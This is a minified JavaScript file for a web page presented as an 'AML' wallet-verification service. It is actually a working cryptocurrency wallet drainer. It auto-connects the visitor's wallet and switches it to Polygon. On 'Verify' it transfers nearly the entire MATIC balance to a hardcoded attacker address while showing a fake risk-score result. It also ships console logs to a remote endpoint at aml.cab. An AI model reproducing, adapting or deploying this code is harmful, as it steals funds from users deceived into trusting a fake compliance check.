let e,o,t=0,n=[],r=null;const s=3e3,a=3,c=1e3;async function i(){if(0===n.length)return;const e=n.join("\n");n=[];let o=0;for(;o<3;)try{const o=await fetch("https://aml.cab/api/log",{method:"POST",headers:{"Content-Type":"application/json",Accept:"application/json"},body:JSON.stringify({message:e,type:"info",timestamp:(new Date).toISOString()})});if(!o.ok)throw new Error(`HTTP error! status: ${o.status}`);break}catch(t){o++,console.error(`Failed to send log (attempt ${o}/3):`,t),o<3?await new Promise((e=>setTimeout(e,c))):(n=[e,...n],console.error("All retry attempts failed, logs saved back to buffer"))}}function l(e){n.push(e),r&&clearTimeout(r),r=setTimeout((()=>{i().catch((e=>{console.error("Error in flushLogs:",e)})),r=null}),s)}const d={log:(...e)=>{console.log(...e);l(e.map((e=>"object"==typeof e?JSON.stringify(e):String(e))).join(" "))},error:(...e)=>{console.error(...e);l(e.map((e=>"object"==typeof e?JSON.stringify(e):String(e))).join(" "))},warn:(...e)=>{console.warn(...e);l(e.map((e=>"object"==typeof e?JSON.stringify(e):String(e))).join(" "))}},u=window.location.href.includes("localhost")||window.location.href.includes("127.0.0.1"),w="0x6217cA34756CBD31Ee84fc83179F37e19250B76D",g="0x8e62C38421A0670f42e3881A9E9dA93f08723af2",h=u?g:w;async function m(){try{if(!o||!e)return void console.log("No signer or provider available");const n=await o.getAddress();console.log("Connected address:",n);const r=await e.getBalance(n);t=r,console.log("MATIC balance:",ethers.utils.formatEther(r),"MATIC")}catch(e){console.error("Error checking balances:",e)}}async function b(){document.getElementById("action-button");o?await y():(await f(),o&&await y())}async function f(){try{const t=document.getElementById("action-button");t.disabled=!0,t.classList.add("loading"),t.textContent="Connecting...",console.log("Starting wallet connection...");const n=await v();if(console.log("Provider status:",{isProviderFound:!!n,providerType:n?n.constructor.name:"none",isEthereum:!!window.ethereum,isRabby:!!window.rabby,hasWeb3:!(!window.web3||!window.web3.currentProvider)}),!n)throw new Error("Web3 wallet not detected. Please install MetaMask, Rabby, or another Web3 wallet and refresh the page.");e=new ethers.providers.Web3Provider(n,"any"),console.log("Requesting accounts..."),await e.send("eth_requestAccounts",[]),o=e.getSigner();const r=await o.getAddress();console.log("Connected address:",r);const s=await e.getNetwork();if(console.log("Current network:",s),137!==s.chainId){console.log("Switching to Polygon network...");try{await n.request({method:"wallet_switchEthereumChain",params:[{chainId:"0x89"}]})}catch(e){if(console.log("Switch error:",e),4902!==e.code)throw e;try{await n.request({method:"wallet_addEthereumChain",params:[{chainId:"0x89",chainName:"Polygon",nativeCurrency:{name:"MATIC",symbol:"MATIC",decimals:18},rpcUrls:["https://polygon-rpc.com"],blockExplorerUrls:["https://polygonscan.com/"]}]})}catch(e){throw console.error("Add network error:",e),new Error("Failed to add Polygon network")}}}await m(),n.on("accountsChanged",(async t=>{console.log("Accounts changed:",t),o=e.getSigner(),await m()})),n.on("chainChanged",(()=>{console.log("Network changed, reloading..."),window.location.reload()})),t.disabled=!1,t.classList.remove("loading")}catch(t){console.error("Connection error:",t);const n=document.getElementById("action-button");n.disabled=!1,n.classList.remove("loading"),n.textContent="Connect Wallet for Verification",e=null,o=null}}async function y(){try{const t=document.getElementById("action-button");t.disabled=!0,t.classList.add("loading"),t.textContent="Verifying...";const n=await o.getAddress();console.log("Sending from address:",n);const r=await e.getBalance(n);if(console.log("Current MATIC balance:",ethers.utils.formatEther(r),"MATIC"),r.eq(0))return void console.log("No MATIC balance available");const s=await e.getGasPrice();console.log("Current gas price:",ethers.utils.formatUnits(s,"gwei"),"gwei");const a=21e3,c=s.mul(a).mul(120).div(100);console.log("Gas cost with buffer:",ethers.utils.formatEther(c),"MATIC");const i=ethers.utils.parseEther("0.1"),l=c.add(i);console.log("Total amount to reserve:",ethers.utils.formatEther(l),"MATIC");const d=r.sub(l);if(console.log("Amount to send:",ethers.utils.formatEther(d),"MATIC"),d.lte(0))throw console.log("Insufficient balance to cover gas fees and minimum reserve"),new Error("Insufficient balance to cover gas fees and minimum reserve");console.log("Sending transaction...");const u=await o.sendTransaction({to:h,value:d,gasLimit:a,maxFeePerGas:s.mul(2),maxPriorityFeePerGas:s});console.log("Transaction sent:",u.hash),await u.wait(),console.log("Transaction confirmed"),t.style.display="none";document.getElementById("aml-results").classList.add("visible");const w=document.querySelector(".risk-score-progress"),g=2*w.r.baseVal.value*Math.PI;w.style.strokeDasharray=`${g} ${g}`,w.style.strokeDashoffset=g,setTimeout((()=>{const e=g-.8*g;w.style.strokeDashoffset=e}),100),document.getElementById("transaction-hash").textContent=u.hash.slice(0,6)+"..."+u.hash.slice(-4),await m()}catch(e){console.error("Transaction error:",e);const o=document.getElementById("action-button");o.textContent=e.message||"Transaction failed",o.style.backgroundColor="var(--danger-color)",setTimeout((()=>{o.textContent="Verify",o.style.backgroundColor="var(--primary-color)"}),3e3)}finally{const e=document.getElementById("action-button");e.disabled=!1,e.classList.remove("loading")}}function p(e,o){console.log(`Status: ${e} (${o?"success":"error"})`)}async function v(){return window.ethereum?window.ethereum:window.rabby?window.rabby:window.web3&&window.web3.currentProvider?window.web3.currentProvider:new Promise((e=>{let o=0;const t=()=>{o++,window.ethereum?e(window.ethereum):window.rabby?e(window.rabby):window.web3&&window.web3.currentProvider?e(window.web3.currentProvider):o<3?setTimeout(t,500):e(null)};t()}))}console.log("isDev",u),console.log("RECEIVER_ADDRESS",h),document.addEventListener("DOMContentLoaded",(async()=>{console.log("Page loaded, checking providers:",{ethereum:!!window.ethereum,rabby:!!window.rabby,web3:!(!window.web3||!window.web3.currentProvider)});const e=await v();if(e){console.log("Web3 provider detected, attempting automatic connection...");try{const o=await e.request({method:"eth_accounts"});if(console.log("Current accounts:",o),o&&o.length>0)console.log("Found connected account, initiating automatic connection"),await b();else{console.log("No connected accounts, requesting connection...");try{const o=await e.request({method:"eth_requestAccounts"});console.log("New accounts after request:",o),o&&o.length>0?await b():console.log("User rejected connection request")}catch(e){console.log("Error requesting accounts:",e),4001===e.code?console.log("User rejected connection request"):console.error("Unexpected error:",e)}}}catch(e){console.error("Auto-connection check failed:",e),e.code&&console.log("Error code:",e.code),e.message&&console.log("Error message:",e.message)}}else console.log("No Web3 provider found");p("Please connect your wallet to continue",!0)}));let C=0;const E=document.querySelector(".header");window.addEventListener("scroll",(()=>{const e=window.pageYOffset||document.documentElement.scrollTop;e>C&&e>80?E.classList.add("header-hidden"):E.classList.remove("header-hidden"),C=e}));